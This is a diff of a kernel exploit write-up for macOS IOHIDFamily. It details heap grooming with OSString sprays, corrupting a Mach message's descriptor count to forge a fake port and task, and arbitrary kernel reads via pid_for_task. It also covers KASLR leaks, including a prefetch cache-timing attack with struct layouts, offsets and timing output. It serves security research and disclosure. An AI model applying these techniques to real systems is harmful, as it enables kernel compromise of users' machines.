+There is one thing though that reads from and, as it happens, also writes to `evg`: `_cursorHelper`. This instance of `IOHIDSystemCursorHelper` is used for both coordinate system arithmetic as well as conversion between the fields `evg->cursorLoc`, `evg->screenCursorFixed` and `evg->desktopCursorFixed`. What's important for us is that is has its own separate storage, so it can act as a cache to some extent. If we can use that to read a value from `evg` at one time and write it back at another, we can copy small amounts of memory to the actual shared memory we have mapped in our task. Now, the "writing back" part is easy enough, if we just look at `IOHIDSystem::initShmem`:
 
 ```c++
 evg->cursorLoc.x = _cursorHelper.desktopLocation().xValue().as32();
@@ -418,7 +445,8 @@ As for reading, we've got three candidates:
     }
     ```
 
-Ok, so how can we reach this code path? `setCursorPosition` is called in two places: `unregisterScreenGated` and `setDisplayBoundsGated`. IOHIDSystem has a notion of virtual screens on which the cursor can be - there are methods to create and destroy such screens, and to set their bounds, all of which are exported as external methods of `IOHIDUserClient`, meaning they are readily accessible to us. So in order to read 4 bytes from a memory structure, we have to:
+Ok, so how can we reach this code path? `setCursorPosition` is called in two places: `unregisterScreenGated` and `setDisplayBoundsGated`. And now this requires some background:  
+IOHIDSystem has a notion of virtual screens on which the cursor can be - there are methods to create and destroy such screens, and to set their bounds. All those functions are exported as external methods of `IOHIDUserClient`, meaning they are readily accessible to us. So in order to read 4 bytes from a memory structure, we have to:
 
 1. Register a virtual screen.
 2. Allocate an `IOSurface`.
@@ -430,7 +458,7 @@ Ok, so how can we reach this code path? `setCursorPosition` is called in two pla
 8. Free the intersecting string(s).
 9. Reallocate the memory with a useful data structure.
 10. Update the bounds of our virtual screen.
-11. Re-initialise `evg`.
+11. Re-initialise `evg` back on actual shared memory.
 12. Read the copied value off shared memory.
 
 **The cursor problem**
@@ -478,9 +506,9 @@ Sounds like fun! :P
 
 No matter what we wanna do to the kernel, at some point we're gonna have to defeat KASLR and learn the kernel slide. If we intend to run some ROP, we need that pretty early on even. So how do we get there?
 
-The prime candidates for revealing the kernel slide are usually pointers in some dynamically allocated structures, which point back to the main kernel binary, often to functions, strings, or C++ vtables. With out ability to read 4 bytes of memory off a choosable memory structure that sounds pretty easy, until you realise that virtually all of those structures are small enough to be handled by zalloc, i.e. we cannot get them to the `kalloc_map` or the `kernel_map`. In fact, I have yet to learn of any object that is or can be made large enough to not be handled by zalloc, and which contains any pointers to the main kernel binary whatsoever. If you know of one, please do hit me up!
+The prime candidates for revealing the kernel slide are usually pointers in some dynamically allocated structures, which point back to the main kernel binary, often to functions, strings, or C++ vtables. With our ability to read 4 bytes of memory off a choosable memory structure, that sounds pretty easy. That is, until you realise that virtually all of those structures are small enough to be handled by zalloc, i.e. we cannot get them to the `kalloc_map` or the `kernel_map`. In fact, I have yet to learn of any object that is or can be made large enough to not be handled by zalloc, and which contains any pointers to the main kernel binary whatsoever. If you know of one, please do tell me!
 
-But let's not despair over that, and let's instead look at what structures we _can_ allocate into the `kalloc_map` or the `kernel_map`. Here's a list of the ones I know, quite possibly incomplete:
+But let's not despair over that, and instead have a look at what structures we _can_ allocate onto the `kalloc_map` or the `kernel_map`. Here's a list of the ones I know, quite possibly incomplete:
 
 -   Data buffers. Examples include `OSString` or some forms of `IOBufferMemoryDescriptor`.
 -   Pointer arrays. Examples are the "buffers" allocated by `OSArray` and `OSDictionary`.
@@ -488,34 +516,34 @@ But let's not despair over that, and let's instead look at what structures we _c
 
 Data buffers contain exclusively user-supplied data, so reading from them is entirely useless, and with writing we could at most break some assumptions that were established through sanitisation earlier, but... meh. Pointer arrays contain exclusively pointers to dynamically allocated objects, so corrupting them might get us code execution if we know an address where we can put a fake object, and reading from them might just tell us where such an address might be once the object is freed. However, neither of those gets us any closer to the kernel slide. That leaves only kmsg's... and boy are kmsg's something! 
 
-So let's take a closer look at kmsg's and to that end, mach messages. When a client sends a mach message, it consists of a _header_ containing the size of the message, destination port, etc., and of a _body_. That body can contain "descriptors", which can be out-of-line memory, an out-of-line array of mach ports, or a single inline mach port. Body space not used up by descriptors is just copied 1:1. This gives us a byte buffer of arbitrary size containing both binary data as well as pointers!  
-When a message enters kernelland through the `mach_msg` trap, the kernel allocates one large designated buffer for it with an `ipc_kmsg` header, and copies it there. Then it resolves port names to pointers, translates descriptors, adds a trailer to it that contains information about the sender, and finally adds the kmsg to the message queue of the destination port. Now, the buffer holding the kmsg needs to be significantly bigger than the raw mach message, not only due to the kmsg header and the message trailer, but also due to the fact that the size of descriptors is different for 32- and 64-bit context, and that the function allocating the buffer has no idea whether there will be any descriptors at all, or where the message is coming from. It only knows the user-specified message size, so it makes the most protective assumptions, i.e. that small descriptors will have to be translated to big ones, and that the entire message body consists of descriptors. Currently that means for every 12 bytes of body size, the kernel allocates 16 bytes - that means we'll have to take special care of the size if we wanna fill a mach message into a hole we punched into the heap. Now, also due to variable size and because descriptors always precede any non-descriptor data sent in a message, mach messages are aligned to the _end_ of the kalloc'ed buffer rather than to the beginning, and the header is pulled backwards as needed when descriptors are translated. To that end, the `ipc_kmsg` header (which sits at the very beginning of the kalloc allocation btw) has a field `ikm_header`, which points to the header of the mach message.
+Let's take a closer look at kmsg's and to that end, mach messages. When a client sends a mach message, it consists of a _header_ containing the size of the message, destination port, etc., and of a _body_. That body can contain "descriptors", which can be out-of-line memory, an out-of-line array of mach ports, or a single inline mach port. Body space not used up by descriptors is just copied 1:1. That gives us a byte buffer of arbitrary size containing both binary data as well as pointers!  
+When a message enters kernelland through the `mach_msg` trap, the kernel allocates one large designated buffer for it with an `ipc_kmsg` header, and copies it there. Then it resolves port names to pointers, translates descriptors, adds a trailer to it that contains information about the sender, and finally adds the kmsg to the message queue of the destination port. Now, the buffer holding the kmsg needs to be significantly larger than the raw mach message, not only due to the kmsg header and the message trailer, but also due to the fact that the size of descriptors is different for 32- and 64-bit contexts. In addition, the function allocating the buffer has no idea whether there will be any descriptors at all or where the message is coming from. It only knows the user-specified message size, so it makes the most protective assumptions, i.e. that small descriptors will have to be translated to big ones, and that the entire message body consists of descriptors. Currently that means for every 12 bytes of body size, the kernel allocates 16 bytes - which means we'll have to take special care of the size if we wanna fill a mach message into a hole we punched into the heap. Now, also due to variable size and because descriptors always precede any non-descriptor data sent in a message, mach messages are aligned to the _end_ of the kalloc'ed buffer rather than to the beginning, and the header is pulled backwards as needed when descriptors are translated. To that end, the `ipc_kmsg` header (which sits at the very beginning of the kalloc allocation btw) has a field `ikm_header`, which points to the header of the mach message.
 
-Knowing all that, how can we use that to our advantage now? Plain reading seems futile at this point, so is _writing_ gonna do us any good? Ian Beer has [previously exploited kmsg's][p0blog] by corrupting the `ikm_size` field of an `ipc_kmsg`, leading to a heap overflow allowing both controlled reading and writing. That requires appropriate objects to reside after the kmsg in memory however, which isn't the case for us (otherwise we'd just move `evg` a couple of pages further and mess with those).  
-What other values do we have? Most values are pointers whose corruption would require far-reaching construction of fake objects, and the few that are not are mostly just flat-out copied to userland. `ikm_header->msgh_size` is used for the size of the copy-out, but corrupting that would just yield another heap overflow. We could corrupt `ikm_header`, which would allow us to construct an entire custom mach message, however that would require us to have some valid ports pointers at the very least (which we could read off the original mach message one by one, but that's tedious). There is another, much nicer field though, which allows us to get basically the same result with much less effort: `msgh_descriptor_count`.  
+Knowing all that, how can we use it to our advantage now? Plain reading seems futile at this point, so is _writing_ gonna do us any good? Ian Beer has [previously exploited kmsg's][p0blog] by corrupting the `ikm_size` field in `ipc_kmsg`, leading to a heap overflow allowing both controlled reading and writing. That requires appropriate objects to reside after the kmsg in memory however, which isn't the case for us (otherwise we'd just move `evg` a couple of pages further and mess with those).  
+What other values do we have? Most fields are pointers whose corruption would require far-reaching construction of fake objects, and the few that are not are mostly just flat-out copied to userland. `ikm_header->msgh_size` is used for the size of the copy-out, but corrupting that would just yield another heap overflow. We could corrupt `ikm_header` which would allow us to construct an entire custom mach message, however that would require some valid ports pointers at the very least (which we could read off the original mach message one by one, but that's tedious). There is another, much nicer field though, which allows us to get basically the same result with much less effort: `msgh_descriptor_count`.  
 Targeting that, we can send a message with a byte buffer and no descriptors, then change `msgh_descriptor_count` from `0` to `1`, and suddenly on receiving the message, the beginning of our byte buffer will be interpreted as a descriptor! :D
 
-The details for this are really straightforward: `msgh_descriptor_count` is a 32-bit int, we've already looked at how to write 32 bits of memory after offsetting `evg`, and targeting the least significant bit fits nicely with our writing mask of `0x01ff20ff`.
+The details for this are really simple: `msgh_descriptor_count` is a 32-bit int, we've already looked at how to write 32 bits of memory after offsetting `evg`, and targeting the least significant bit fits nicely with our writing mask of `0x01ff20ff`.
 
 With that figured out, we can create and "send ourselves" anything that a descriptor can describe. The most straightforward choice to me seems a fake mach port with a fake task struct, which will then allow us to read arbitrary memory via `pid_for_task`. This technique has previously been used by [Luca Todesco][qwerty] in the [Yalu102 jailbreak][yalu102], and subsequently by [tihmstar][tihm] and yours truly in [Phœnix][phoenix] and [PhœnixNonce][phnonce].  
-Now, in order to pull that off, we need an address at which we can put our fake port and task structs. On devices without SMAP, we could just put those in our process memory and do a dull userland dereference. We're not gonna do that though, since for one my MacBook (on which I was developing the exploit for the biggest part) is equipped with SMAP, and secondly because it's always nice to break one more security feature if you can. :P  
-Alright, so we need a _kernel_ address - but guess what, we already have one in our kmsg: `ikm_header`! Now, we can't use that _directly_ though since the entire kmsg will be deallocated once we receive it, but knowing the size of the message we've sent, we can use `ikm_header` to calculate the address of the kmsg header - and due to the very nature of our exploit, there happens to exist something at a known offset from that address: IOHIDSystem shared memory. So we just made `0x6000` bytes of directly writeable, kernel-adressable memory - for getting exploit data into the kernel, it can hardly get any nicer tha that!
+Now in order to pull that off, we need an address at which we can put our fake port and task structs. On devices without SMAP, we could just put those in our process memory and do a dull userland dereference. We're not gonna do that though, since for one my MacBook (on which I was developing the exploit for the biggest part) is equipped with SMAP, and secondly because it's always nice to break one more security feature if you can. :P  
+Alright, so we need a _kernel_ address - but guess what, we already have one in our kmsg: `ikm_header`! Now, we can't use that _directly_ since the entire kmsg will be deallocated once we receive it, but knowing the size of the message we've sent, we can use `ikm_header` to calculate the address of the `ipc_kmsg` header - and due to the very nature of our exploit, there happens to exist something at a known offset from that address: IOHIDSystem shared memory. So we just made `0x6000` bytes of directly writeable, kernel-adressable memory - for getting exploit data into the kernel, it hardly gets any nicer than that!
 
-So, how does reading `ikm_header` work in detail? Being an address makes it 64 bits wide, which means that we'll have to read it in two steps. Since one reading operation resets `evg`, we'll need to do an entire cycle of deallocating the kmsg, filling the space with buffer memory, offsetting `evg` again, and allocating a new kmsg between the two readings. But if the new kmsg has the same size as the old one and is filled into the same heap hole, then `ikm_header` is gonna hold the same value, so that won't be a problem.  
+So, how does reading `ikm_header` work in detail? Being an address makes it 64 bits wide, which means that we'll have to read it in two steps. Since every reading operation resets `evg`, we'll need to do an entire cycle of deallocating the kmsg, filling the space with buffer memory, offsetting `evg` again, and allocating a new kmsg between the two readings. But if the new kmsg has the same size as the old one and is filled into the same heap hole, then `ikm_header` is gonna hold the same value, so that won't be a problem.  
 There is one more thing though: remember the **cursor problem**? To find out how that affects us in this case, let's have a look at the first few members of the `ipc_kmsg` and `EvGlobals` structs:
 
-![data structure visualisation](assets/img/1-structs.svg)
+[![data structure visualisation][img1]][img1]
 
 When reading the top 32 bits of `ikm_header`, they overlay like this:
 
-![heap diagram](assets/img/2-overlay.svg)
+[![heap diagram][img2]][img2]
 
-`evg->cursorSema` falls onto the bottom 32 bits of `ikm_next`, which is a pointer to another kmsg. Since that one will also have been allocated via `kalloc`, the lower 32 bits of the pointer are exceedingly unlikely to all be zero, so in this case we should be safe.  
+`evg->cursorSema` falls onto the bottom 32 bits of `ikm_next`, which is a pointer to another kmsg. Since that one will also have been allocated via `kalloc`, the lower 32 bits of the pointer are exceedingly unlikely to be zeroes, so in this case we should be safe.  
 What about the bottom 32 bits of `ikm_header` then?
 
-![another heap diagram](assets/img/3-overlay.svg)
+[![another heap diagram][img3]][img3]
 
-Now `evg->cursorSema` falls onto the padding between `ikm_size` and `ikm_next`. I don't see that being zeroed anywhere so in theory it could be anything, however in practice I have only ever seen zeroes there (and even if that's not always the case, it remains a possibility). So when we perform our reading operation, `IOHIDSystem::_setCursorPosition` will run through and `evg->screenCursorFixed` and `evg->desktopCursorFixed` will be written to, which intersect with `ikm_importance` and `ikm_inheritance` (marked red in the diagram). That's bad. When we receive the kmsg and `mach_msg_receive_results` is called, it will invoke `ipc_importance_receive` which will lead us to this bit (assuming we don't have a voucher):
+Now `evg->cursorSema` falls onto the padding between `ikm_size` and `ikm_next`. I don't see that being zeroed out anywhere in the code so in theory it could be anything, however in practice I have only ever seen zeroes there (and even if that's not always the case, it remains a possibility). So when we perform our reading operation, `IOHIDSystem::_setCursorPosition` will run through and `evg->screenCursorFixed` and `evg->desktopCursorFixed` will be written to, which intersect with `ikm_importance` and `ikm_inheritance` (marked red in the diagram). That's bad. When we receive the kmsg and `mach_msg_receive_results` is called, it will invoke `ipc_importance_receive` which will lead us to this bit (assuming we don't have a voucher):
 
 ```c
 if (IIE_NULL != kmsg->ikm_importance) {
@@ -531,7 +559,7 @@ if (IIE_NULL != kmsg->ikm_importance) {
 }
 ```
 
-Remember, the values written to `evg->screenCursorFixed` and `evg->desktopCursorFixed` depend on the values previously read from `evg->cursorLoc`. Since we're reading a valid pointer, we will write non-zero values which means that `IIE_NULL != kmsg->ikm_importance` will hold true and the if block will be entered. That will then lead to a call to `ipc_importance_kmsg_unlink`, which is defined as follows:
+Recall that the values written to `evg->screenCursorFixed` and `evg->desktopCursorFixed` depend on the values previously read from `evg->cursorLoc`. Since we're reading a valid pointer, we will write non-zero values there which means that `IIE_NULL != kmsg->ikm_importance` will hold true and the if block will be entered. That will then lead to a call to `ipc_importance_kmsg_unlink`, which is defined as follows:
 
 ```c
 static ipc_importance_elem_t ipc_importance_kmsg_unlink(ipc_kmsg_t kmsg)
@@ -583,25 +611,25 @@ MACRO_END
 
 So `ipc_importance_kmsg_unlink` will ultimately dereference all of `ikm_importance`, `ikm_inheritance.prev` and `ikm_inheritance.next`, which we corrupt. Due to the conversion between `cursorLoc` and `screenCursorFixed`/`desktopCursorFixed`, there is no way the values we write can be valid pointers again. So we have no choice but to somehow repair what we're breaking with reading before we can receive the kmsg, and the only tool we've got at our disposal to pull this off is `evg`. In order to determine what is and isn't possible, we first have to finalise our plan for how exactly we shape the heap.
 
-In my implementation, I'm first spraying `OSString`s of size `0x3000`. After offsetting `evg` and detecting where it lands, I punch a hole of size `0x30000` (i.e. just deallocate 16 strings) for the kmsg, but before doing so I create at lower addresses 16 other holes of size `0x2d000` (i.e. 15 strings). That way, any new allocations of `0x2d000` bytes or less will first fill up those holes before interfering with our plans, and any allocations bigger than `0x30000` bytes are too big for our kmsg hole and will leave us alone anyway.  
+In my implementation, I'm first spraying `OSString`s of size `0x3000`. After offsetting `evg` and detecting where it lands, I punch a hole of size `0x30000` (i.e. just deallocate 16 strings) for the kmsg, but before doing so I create at lower addresses 16 other holes of size `0x2d000` (i.e. 15 strings). That way, new allocations of `0x2d000` bytes or less will first fill up those holes before interfering with our plans, and any allocations bigger than `0x30000` bytes are too big for our kmsg hole and will leave us alone anyway.  
 Now, what does a kmsg size of `0x30000` bytes imply? Currently on High Sierra, the sizes of `struct ipc_kmsg`, `mach_msg_base_t` and `mach_msg_max_trailer_t` are `0x58`, `0x24` and `0x44` bytes respectively, and we've already seen that the kernel reserves 16 bytes for every 12 bytes of message body size. That means the body part of our kmsg will have to be `0x30000 - 0x58 - 0x24 - 0x44 = 0x2ff40` bytes, so the mach message we send will need a `0x2ff40 / 16 * 12 = 0x23f70` bytes body. Since we don't send any descriptors, that will actually lead to `0x2ff40 - 0x23f70 = 0xbfd0` bytes after the kmsg header being completely unused. That's good, because that lets us do whatever we want with `evg` around the kmsg header without the chance of corrupting anything after it. And due to our hole-punching, there will still be a string buffer of `0x3000` bytes right before it - not quite enough to buffer the full `0x5ae8` bytes of `evg`, but still a lot.
 
-Now, what can we _actually_ do with `evg` in terms of repairs? The easiest thing would be if we could just use `evg->eventFlags` to write zeroes. For that, we have to consider both initialisation and kernel usage of the values around `eventFlags`.
+So what can we _actually_ do with `evg` in terms of repairs now? The easiest thing would be if we could just use `evg->eventFlags` to write zeroes. For that, we have to consider both initialisation and kernel usage of the values around `eventFlags`.
 
-![evg initialisation](assets/img/4-evg.svg)
+[![evg initialisation][img4]][img4]
 
-That looks rather bad. The fact that values so shortly before and after `eventFlags` are initialised to non-zero or unknown values means that when we write `0` four times, at leats one of those will be overwritten again. The next best approach (to me anyway) would seem to try and use `cursorSema` initialisation to zero out things - since it's at the very beginning of `evg` there will be no writes before it, so we could just continuously shift `evg` further down in memory until we're after the kmsg header. However if `cursorSema` is zero, the kernel may change it to a non-zero value at any given time. If that happens right before we move `evg` again, we leave a non-zero value and haven't repaired anything. There are some more fields in `evg` that are initialised to zero, most notably in `evg->lleq`, an array of `NXEQElement`s. As far as I can tell, no code in `IOHIDFamily` accesses that memory at all beyond initialisation, and it doesn't seem to be exported to anywhere in kernelland either. That puts kernel writes out of the way and just leaves initialisation:
+That looks rather bad. The fact that values so shortly before and after `eventFlags` are initialised to non-zero or unknown values means that when we write `0` four times, at least one of those will be overwritten again. The next best approach (to me anyway) would seem to try and use `cursorSema` initialisation to zero out things - since it's at the very beginning of `evg` there will be no writes before it, so we could just continuously shift `evg` further down in memory until we're after the kmsg header. However if `cursorSema` is zero, the kernel may change it to a non-zero value at any given time. If that happens right before we move `evg` again, we leave a non-zero value and haven't repaired anything. There are some more fields in `evg` that are initialised to zero, most notably in `evg->lleq`, an array of `NXEQElement`s. As far as I can tell, no code in `IOHIDFamily` accesses that memory at all beyond initialisation, and it doesn't seem to be exported to anywhere in kernelland either. That puts kernel writes out of the way and just leaves initialisation:
 
-![lleq initialisation](assets/img/5-lleq.svg)
+[![lleq initialisation][img5]][img5]
 
 Since we have an array of those, we can nicely use `lleq[1]` to zero things out while the last 64 bytes of `lleq[0]` will give us enough space to leave the rest of the header intact:
 
-![lleq zeroing](assets/img/6-zero.svg)
+[![lleq zeroing][img6]][img6]
 
 (As is visible, it gives us _only just_ enough space, down to the bit! As if we're blessed with luck or something. :D)  
-Using the `sema` and `event.type` fields to zero out, we need to perform three operations in total - two to undo the earlier corruption, and one more because the `next` field writes non-zero values again right before the memory we zero out. That will lead to a non-zero value being stored in `ikm_qos_override`, but that has no bad consequence. Note we _could_ also have used the last element of `lleq` instead, which gets its `next` field set to zero, but then we would've again had to make sure that we have `0x6000` bytes of mapped memory instead of just `0x3000`, and... meh.
+Using the `sema` and `event.type` fields to zero out, we need to perform three operations in total - two to undo the earlier corruption, and one more because the `next` field writes non-zero values again right before the memory we zero out, which is the lower half of `ikm_importance`. Ultimately we will write a non-zero value to `ikm_qos_override`, but that has no bad consequence. Note we _could_ also have used the last element of `lleq` instead, which gets its `next` field set to zero, but then we would've again had to make sure that we have `0x6000` bytes of mapped memory instead of just `0x3000`, and... meh.
 
-Anyway we can repair the kmsg now, and with that there's nothing standing between us and our fake mach port anymore! Well, except the actual fake port and it kobject, that is. Getting a usable definition of `struct ipc_port` to userland is a bit tedious and requires digging through a dozen headers, but here's the result (to be fair, I had done most of the work for Phœnix/PhœnixNonce already and merely had to update it - also, `kptr_t` is just typedef'ed as `uint64_t`):
+Anyway we can repair the kmsg now, and with that there's nothing standing between us and our fake mach port anymore! Well, except the actual fake port and its kobject, that is. Getting a usable definition of `struct ipc_port` to userland is a bit tedious and requires digging through a dozen headers, but here's the result (to be fair, I had done most of the work for Phœnix/PhœnixNonce already and merely had to update it - also, `kptr_t` is just typedef'ed to `uint64_t`):
 
 ```c
 typedef struct {
@@ -647,7 +675,7 @@ typedef struct {
 } kport_t;
 ```
 
-With `struct task` I was much lazier, only defining what's necessary (except for `ip_lock`, which isn't actually needed):
+With `struct task` I was much lazier, only defining what's really necessary (with the exception of `ip_lock`, which isn't actually needed):
 
 ```c
 typedef struct
@@ -666,6 +694,7 @@ typedef struct
 `OFF_TASK_BSD_INFO` is the offset of the `bsd_info` field in the kernel's task struct, which can be grabbed from the disassembly of `get_bsdtask_info` (here `0x390`):
 
 ```
+;-- _get_bsdtask_info:
 0xffffff80002bccd0      55             push rbp
 0xffffff80002bccd1      4889e5         mov rbp, rsp
 0xffffff80002bccd4      488b87900300.  mov rax, qword [rdi + 0x390]
@@ -693,13 +722,13 @@ ktask->ref_count = 100;
 
 The reference and right counts are just arbitrary numbers high enough to make sure no deallocation is attempted. The two `MACH_PORT_QLIMIT_KERNEL` are there to prevent any accidental message being sent to the port (by simulating a full message queue), which would attempt to dereference the pointer `ip_messages.klist.messages`, which we don't set. Anything else should be fairly straightforward. Now in order to read 4 bytes from an arbitrary kernel address, we merely need to set `bsd_info` to the address we want minus `0x10` bytes (because that's the offset the `pid` field has in `struct proc`) and call `pid_for_task` on it.
 
-At last, we've successfully turned very constrained read and write primitives into full arbitrary read. Now we just need something to read from - we're after the kernel slide, which we still don't know. We only know the addresses of our shared memory and of our kmsg hole. So it'd be nice if we could reuse that somehow to learn the slide. We already enumerated what structures we can allocate in such a place:
+At last, we've successfully turned very constrained read and write primitives into full arbitrary read. Now we just need something to read from - we're after the kernel slide, which we still don't know. We only know the addresses of our shared memory and of our kmsg hole. So it'd be nice if we could reuse the latter somehow to learn the slide. We already enumerated what structures we can allocate in such a place:
 
 -   Data buffers.
 -   Pointer arrays.
 -   `struct ipc_kmsg`.
 
-In the beginning, the problem with pointer arrays was that they would only ever contain pointers to objects allocated on the heap, where we couldn't follow with our constrained read primitive. With arbitrary read however, things are looking much better! If we allocate, say, an `OSArray`, read the pointer to the first object it contains, and from that address read the first 8 bytes, we get its vtable - which resides in `__CONST.__constdata`, and whose address thus reveals the kernel slide. Now we only have to allocate an OSArray large enough for its pointer buffer to reach `0x30000` bytes. One way of achieving this would be to actually allocate an array with 24'576 elements (we could use all `OSBoolean`s to go easy on memory), but we don't even have to. We can take advantage of the binary serialisation format, namely the fact that dicts, arrays and sets take and use a length specifier from userland. Effectively, we can set an `OSArray`'s size to `0x6000` (that is later multiplied by the size of a pointer) but then supply only one element. But even if we didn't have all that, we could ultimately also send a kmsg with an actual port to e.g. an `IOService` object.
+In the beginning, the problem with pointer arrays was that they would only ever contain pointers to objects allocated on the heap, to where we couldn't follow with our constrained read primitive. With arbitrary read however, things are looking much better! If we allocate, say, an `OSArray`, read the pointer to the first object it contains, and from that address read the first 8 bytes, we get its vtable - which resides in `__CONST.__constdata` and whose address thus reveals the kernel slide. Now we only have to allocate an `OSArray` large enough for its pointer array to reach `0x30000` bytes. One way of achieving this would be to actually allocate an array with 24'576 elements (we could use all `OSBoolean`s to go easy on memory), but we don't even have to. We can take advantage of the binary serialisation format, namely the fact that dictionaries, arrays and sets take a length specifier from userland. Effectively, we can set an `OSArray`'s size to `0x6000` (that is later multiplied by the size of a pointer) but then supply only a single element (I'll call this an "inflated array"). Even if we didn't have all that though, we could ultimately also send a kmsg with an actual port to e.g. an `IOService` object, which would also get us a C++ object pointer.
 
 So in review, we:
 
@@ -711,24 +740,24 @@ So in review, we:
 6. Read `ikm_header` off it, yielding the shmem kernel address.
 7. Repair any damage we've done.
 8. Allocate a new kmsg with body bytes corresponding to a port descriptor pointing to somewhere in shared memory.
-9. Switch `msgh_descriptor_count` from `0` to `1` so that our bytes are actually interpreted as a descriptor.
+9. Flip `msgh_descriptor_count` from `0` to `1` so that our bytes are actually interpreted as a descriptor.
 10. Construct a fake port and task on the shared memory.
 11. Receive the kmsg, thus inserting the fake port into our namespace.
 12. Point `fakeport.ip_kobject.bsd_info` to an address and use `pid_for_tak(fakeport)` to read from it.
 
-At that point we could also attach a `vm_map_t` (such as the `kernel_map`) to our fake task to gain full r/w, or swap the fake task out for a fake `IOService` object with a custom vtable, allowing us to call arbitrary kernel code. I'm gonna leave it at leakage of the kernel slide here though.
+At that point we could also attach a `vm_map_t` (say, the `kernel_map`) to our fake task to gain full r/w, or swap the fake task out for a fake `IOService` object with a custom vtable, allowing us to call arbitrary kernel code. I'm gonna leave it at leakage of the kernel slide here though.
 
-_This is implemented in [`src/leak/main.c`](TODO)._
+_This is implemented in [`src/leak/main.c`](../src/leak/main.c)._
 
 ### Leaking the kernel slide, the cheater's way
 
-The above is nice and all (and was actually super fun to piece together), but it has a slight drawback: scanning all these `OSString`s to find out where `evg` landed takes a significant amount of time to execute, and that is after getting the `IOHIDUserClient` port. In a real attack scenario, that would mean that if we run on a logout, the user would be confronted with a black screen for quite a bit longer than they'd expect, and if we run on a shutdown/reboot, we might even get killed before we get our work done (this depends on physical memory size, and is also less likely when targeting the `kalloc_map` but more likely with the `kernel_map`). On top of that, the above way was chronologically the last part of the exploit I wrote. For those reasons we're gonna look at another way to leak the kernel slide, one that can be executed independently of any other part of the exploit: hardware vulnerabilities!
+The above is nice and all (and was actually super fun to piece together), but it has a slight drawback: scanning all these `OSString`s to find out where `evg` landed takes a significant amount of time to execute, and that is after getting the `IOHIDUserClient` port. In a real attack scenario, that would mean that if we run on a logout, the user would be confronted with a black screen for quite a bit longer than they'd expect and be comfortable with, and if we run on a shutdown/reboot, we might even get killed before we get our work done (this depends on physical memory size, and is also less likely when targeting the `kalloc_map` but more likely with the `kernel_map`). On top of that, the above way to leak the slide was chronologically the last part of the exploit I wrote. For those reasons we're gonna look at another way to leak the kernel slide, one that can be executed independently of any other part of the exploit: hardware vulnerabilities!
 
-Long story short, we're doing a prefetch cache timing attack [as devised by Gruss et al][prefetch]. I add nothing new to this technique, I merely wrote my own implementation of it. For those unfamiliar with how it works, the basic vulnerabilities lie in the x86 `prefetchtN` instructions (where `N` can be `1`, `2`, ...). Those were designed as hints to the CPU that the program requests data at some address to be loaded into a particular cache, but they have a few interesting properties:
+Long story short, we're doing a prefetch cache timing attack [as devised by Gruss et al][prefetch]. I add nothing new to this technique, I merely wrote my own implementation. For those unfamiliar with how it works, the basic vulnerabilities lie in the x86 `prefetchtN` instructions (where `N` can be `1`, `2`, ...). Those were designed as hints to the CPU that the program wants data at some address loaded into a particular cache, but they have a few interesting properties:
 
-- They ignore access permissions of all kinds, allowing even the prefetching of kernel memory.
+- They ignore access permissions of all kinds, allowing even the prefetching of kernel memory (we're still not able to read that from the cache then though).
 - They perform a number of address lookup attempts, and stop as soon as they find something. This means that for an unitialised (or evicted) cache, they execute significantly faster for mapped addresses than unmapped ones.
-- They silently ignore all errors (not a vulnerability in that sense, but a nice property).
+- They silently ignore all errors (not an actual vulnerability, but a nice property).
 
 Interestingly enough, no implementation I found on the web seemed to work for me, so I ended up writing my own. Like in the paper, I target the `prefetcht2` instruction (i.e. the L2 cache), and for every timing I do:
 
@@ -737,9 +766,9 @@ Interestingly enough, no implementation I found on the web seemed to work for me
 3. Invoke `prefetcht2`.
 4. Use `rdtscp` before and after it to get the time difference.
 
-For eviction I use the L3 cache rather than just the L2, because then misses will have to go to main memory, which leaves a much bigger mark in the time difference (there's also a notable difference when targeting L2, it's just a lot smaller). The most efficient way to do that is to allocate a memory block as large as the L3 cache, divide them into parts as large as the cache line size, and do a single memory read on each of those parts. Conveniently, there are two `sysctl` entries `hw.cachelinesize` and `hw.l3cachesize` giving us just the information we need.
+For eviction I use the L3 cache rather than just the L2, because then misses will have to go to main memory, which leaves a much bigger mark in the time difference (there's also a notable difference when evicting L2, it's just a lot smaller). The most efficient way (I know of) to do that is to allocate a memory block as large as the L3 cache, divide it into parts as large as the cache line size, and do a single memory read on each of those parts. Conveniently, there are two `sysctl` entries `hw.cachelinesize` and `hw.l3cachesize` giving us exactly those sizes.
 
-Now in order to find the kernel base, I just start at address `0xffffff8000000000`, go up to `0xffffff8020000000` in steps of `0x100000` bytes, perform 16 timings at each step and throw in a `sched_yield()` before each timing to minimise external interference. I implemented that in [`data/kaslr.c`](TODO), and running it yields the following:
+Now in order to find the kernel base, we just start at address `0xffffff8000000000`, go up to `0xffffff8020000000` in steps of `0x100000` bytes, perform 16 timings at each step and throw in a `sched_yield()` before each timing to minimise external interference. I implemented that in [`data/kaslr.c`](../data/kaslr.c), and running it yields the following:
 
     0xffffff8000000000     32    452     32     32     32     32     32     32     32     32    116     31     28     28     28     31
     0xffffff8000100000    558    232    235    468    232    332    499    335    242    301    239    291    874    369    343    286
@@ -1254,36 +1283,36 @@ Now in order to find the kernel base, I just start at address `0xffffff800000000
     0xffffff801fe00000    286     35     35     35     24     24     24     24     24     24     24     35     35     35     35     35
     0xffffff801ff00000    236     24     24     24     35     24     24     35     24     35     24     35     24     35     24     35
 
-Here the kernel base is `0xffffff800f200000`, and the difference of timings before and after is very visible. Formalising what indicates the location of the kernel base and what doesn't is not trivial though, mostly due to outliers. By dull trial-and-error I have found the following to be highly reliable, at least on my machines:
+Here the kernel base is `0xffffff800f200000`, and the difference of timings before and after is very visible. Formalising what does or does not indicate the location of the kernel base isn't trivial though, mostly due to outliers. By dull trial-and-error I have found the following procedure to be highly reliable, at least on my two machines:
 
 1. Sort the 16 timings for each address from shortest to longest.
-2. Discard all but the middle 4 values, and calculate the average of those.
-3. If that value is below 50, treat the address as mapped, otherwise treat it as unmapped.
+2. Discard all but the middle 4 values, and calculate the average over those.
+3. If that value is below `50`, treat the address as mapped, otherwise treat it as unmapped.
 4. Find the first block of mapped addresses large enough to contain the kernel's `__TEXT` segment.
 
-_This is implemented in [`src/hid/kaslr.c`](TODO)._
+_This is implemented in [`src/hid/kaslr.c`](../src/hid/kaslr.c)._
 
-Despite the authors of the paper stating that their attack works also in virtualised environments, I observed timings for mapped and unmapped pages to be indistinguishable on a Sierra installation running inside VirtualBox. But whatever, I've already shown that my bug can leak the kernel slide too if need be. :P
